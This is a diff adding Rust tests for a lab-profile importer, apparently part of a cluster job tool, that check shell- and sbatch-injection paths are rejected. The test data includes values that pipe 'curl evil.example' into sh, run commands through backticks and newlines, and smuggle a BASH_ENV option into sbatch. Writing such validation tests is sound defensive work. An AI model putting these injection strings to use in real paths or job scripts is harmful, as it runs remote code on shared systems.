@@ -781,6 +781,76 @@ mod tests {
     }
 
     #[test]
+    fn a_shared_results_root_or_code_root_that_job_scripts_would_run_is_refused() {
+        let clean = export_lab_profile(&cluster_b(), &[]).expect("export");
+        let value: serde_json::Value = serde_json::from_str(&clean).unwrap();
+        for bad in [
+            "/data/lab/x$(curl${IFS}-fsS${IFS}evil.example|sh)",
+            "/data/lab/x`id`",
+            "/data/lab/x\";touch marker;\"",
+            "/data/lab/x\\y",
+            "/dev/null\necho INJECTED_LINE_RAN #",
+            "/shared/lab/runs\ncurl -s evil.example|sh\n#",
+        ] {
+            let mut results = value.clone();
+            results["profile"]["results_root"] = serde_json::json!(bad);
+            let error = prepare_lab_import(&results.to_string(), &student())
+                .expect_err(&format!("results_root {bad:?}"));
+            assert!(error.contains("results folder"), "{bad:?}: {error}");
+
+            let mut code = value.clone();
+            code["profile"]["code_roots"] = serde_json::json!(["/data/code", bad]);
+            let error = prepare_lab_import(&code.to_string(), &student())
+                .expect_err(&format!("code root {bad:?}"));
+            assert!(error.contains("code folder"), "{bad:?}: {error}");
+        }
+    }
+
+    #[test]
+    fn a_shared_results_root_that_sbatch_would_split_into_options_is_refused() {
+        let clean = export_lab_profile(&cluster_b(), &[]).expect("export");
+        let value: serde_json::Value = serde_json::from_str(&clean).unwrap();
+        for bad in [
+            // The round-1 bypass: sbatch reads --export=...BASH_ENV as a job option.
+            "/dev/null --export=ALL,BASH_ENV=/data/lab/evil.sh #",
+            "/data/lab/r --chdir=/data/lab/evil --comment=x",
+            "/data/My Lab/runs",
+            "/data/o'brien/runs",
+            "/data/lab#2/runs",
+        ] {
+            let mut results = value.clone();
+            results["profile"]["results_root"] = serde_json::json!(bad);
+            let error = prepare_lab_import(&results.to_string(), &student())
+                .expect_err(&format!("results_root {bad:?}"));
+            assert!(error.contains("results folder"), "{bad:?}: {error}");
+            assert!(error.contains("spaces, '#' or quotes"), "{bad:?}: {error}");
+        }
+        // The importer's own home is substituted into {{home}}; a home with a
+        // space never gets that far (the home check allows only a plain path).
+        let mut placeholder = value.clone();
+        placeholder["profile"]["results_root"] = serde_json::json!("{{home}}/results");
+        let mut spaced_home = student();
+        spaced_home.home = "/home/sam --chdir=/tmp".to_string();
+        let error = prepare_lab_import(&placeholder.to_string(), &spaced_home)
+            .expect_err("home with a space");
+        assert!(error.contains("home directory"), "{error}");
+    }
+
+    #[test]
+    fn a_shared_results_root_under_a_tilde_home_asks_for_an_absolute_path() {
+        let clean = export_lab_profile(&cluster_b(), &[]).expect("export");
+        let mut value: serde_json::Value = serde_json::from_str(&clean).unwrap();
+        value["profile"]["results_root"] = serde_json::json!("{{home}}/results");
+        let mut tilde_home = student();
+        tilde_home.home = "~".to_string();
+        let error = prepare_lab_import(&value.to_string(), &tilde_home).expect_err("~ home");
+        assert!(error.contains("absolute path"), "{error}");
+        // The same file with an absolute home imports as before.
+        let imported = prepare_lab_import(&value.to_string(), &student()).expect("absolute home");
+        assert_eq!(imported.profile.results_root, "/home/sam/results");
+    }
+
+    #[test]
     fn every_secret_shaped_file_key_is_refused() {
         let clean = export_lab_profile(&cluster_b(), &[]).expect("export");
         for key in [
